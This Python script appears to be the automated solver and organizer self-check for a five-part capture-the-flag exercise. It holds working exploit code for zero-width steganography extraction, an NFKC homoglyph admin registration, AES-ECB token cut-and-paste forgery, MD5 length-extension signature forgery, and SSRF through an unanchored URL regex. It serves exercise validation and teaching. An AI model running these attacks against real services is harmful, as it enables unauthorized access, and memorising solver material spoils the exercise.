#!/usr/bin/env python3
"""
Bastion CTF — automated solver / organizer self-check.
All 5 needles. Pure stdlib (MD5 length extension is hand-rolled).
Usage: solve.py <base-url>      e.g. http://localhost:8093
Exits 0 only if all 5 flags are captured.
"""
import sys, re, json, base64, struct, math, urllib.request, urllib.parse, urllib.error

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
def mf(t): m = re.search(r"BAS\{[^}]*\}", t or ""); return m.group(0) if m else None

def get(path, headers=None):
    req = urllib.request.Request(BASE + path, headers=headers or {})
    try:
        return urllib.request.urlopen(req, timeout=15).read().decode("latin1")
    except urllib.error.HTTPError as e:
        return e.read().decode("latin1")

def postj(path, obj):
    req = urllib.request.Request(BASE + path, data=json.dumps(obj).encode(),
                                 headers={"Content-Type": "application/json"})
    try:
        return urllib.request.urlopen(req, timeout=15).read().decode("latin1")
    except urllib.error.HTTPError as e:
        return e.read().decode("latin1")

flags = {}

# ---- C1: zero-width stego --------------------------------------------------
html = get("/").encode("latin1").decode("utf-8", "replace")   # recover real unicode
bits = "".join("0" if c == "​" else "1" for c in html if c in "​‌")
raw = bytes(int(bits[i:i+8], 2) for i in range(0, len(bits) - len(bits) % 8, 8))
flags[1] = mf(raw.decode("latin1", "replace"))
print("[1] zero-width stego      ", flags[1])

# ---- C2: NFKC homoglyph admin ---------------------------------------------
flags[2] = mf(postj("/api/register", {"name": "ᴬdmin"}))   # 'ᴬdmin'
print("[2] NFKC homoglyph admin  ", flags[2])

# ---- C3: AES-ECB cut-and-paste --------------------------------------------
#  plaintext = "name=" + <name> + "&role=user" ; block size 16.
#  (A) name that puts "admin"+pad in its own block -> capture that ciphertext block
nameA = "A" * 11 + "admin" + "\x0b" * 11
ctA = base64.b64decode(json.loads(postj("/api/register", {"name": nameA}))["token"])
c_admin = ctA[16:32]
#  (B) name so "name=<B>&role=" fills exactly one block -> "user" starts the next
nameB = "B" * 5
ctB = base64.b64decode(json.loads(postj("/api/register", {"name": nameB}))["token"])
forged = base64.b64encode(ctB[0:16] + c_admin).decode()
flags[3] = mf(get("/vault?token=" + urllib.parse.quote(forged)))
print("[3] ECB cut-and-paste     ", flags[3])

# ---- C4: MD5 length extension ---------------------------------------------
_S = [7,12,17,22]*4 + [5,9,14,20]*4 + [4,11,16,23]*4 + [6,10,15,21]*4
_K = [int(abs(math.sin(i + 1)) * 2**32) & 0xffffffff for i in range(64)]
def _rol(x, c): return ((x << c) | (x >> (32 - c))) & 0xffffffff
def _md5_block(st, blk):
    a, b, c, d = st
    M = struct.unpack("<16I", blk)
    for i in range(64):
        if i < 16: f, g = (b & c) | (~b & d), i
        elif i < 32: f, g = (d & b) | (~d & c), (5*i + 1) % 16
        elif i < 48: f, g = b ^ c ^ d, (3*i + 5) % 16
        else: f, g = c ^ (b | ~d), (7*i) % 16
        f = (f + a + _K[i] + M[g]) & 0xffffffff
        a, d, c = d, c, b
        b = (b + _rol(f, _S[i])) & 0xffffffff
    return [(st[0]+a) & 0xffffffff, (st[1]+b) & 0xffffffff, (st[2]+c) & 0xffffffff, (st[3]+d) & 0xffffffff]
def _md5pad(n):   # padding for a message of n bytes
    return b"\x80" + b"\x00" * ((56 - (n + 1)) % 64) + struct.pack("<Q", n * 8)
def md5_extend(orig_hex, suffix, prior_len):
    """sig for (prefix[prior_len] || suffix||pad) given md5 digest over prefix."""
    st = list(struct.unpack("<4I", bytes.fromhex(orig_hex)))
    total = prior_len + len(suffix)
    msg = suffix + _md5pad(total)
    for i in range(0, len(msg), 64):
        st = _md5_block(st, msg[i:i+64])
    return struct.pack("<4I", *st).hex()

ex = json.loads(get("/api/report"))["example"]
data0 = bytes.fromhex(ex["data"]); sig0 = ex["sig"]; suffix = b"&admin=1"
for klen in range(1, 40):                      # brute the unknown secret length
    glue = _md5pad(klen + len(data0))
    prior = klen + len(data0) + len(glue)
    forged_data = data0 + glue + suffix
    forged_sig = md5_extend(sig0, suffix, prior)
    r = get(f"/api/report?data={forged_data.hex()}&sig={forged_sig}")
    f4 = mf(r)
    if f4: flags[4] = f4; break
print("[4] MD5 length extension  ", flags.get(4))

# ---- C5: unanchored-regex SSRF --------------------------------------------
flags[5] = mf(get("/api/preview?url=" +
                  urllib.parse.quote("http://127.0.0.1/_internal/flag?x=bastion.internal", safe="")))
print("[5] unanchored-regex SSRF ", flags[5])

print("\n== flags ==")
for i in range(1, 6):
    print(f"  FLAG {i}: {flags.get(i) or '<missing>'}")
ok = all((flags.get(i) or "").startswith("BAS{") for i in range(1, 6))
print("\nRESULT:", "ALL 5 FLAGS CAPTURED" if ok else "INCOMPLETE")
sys.exit(0 if ok else 1)
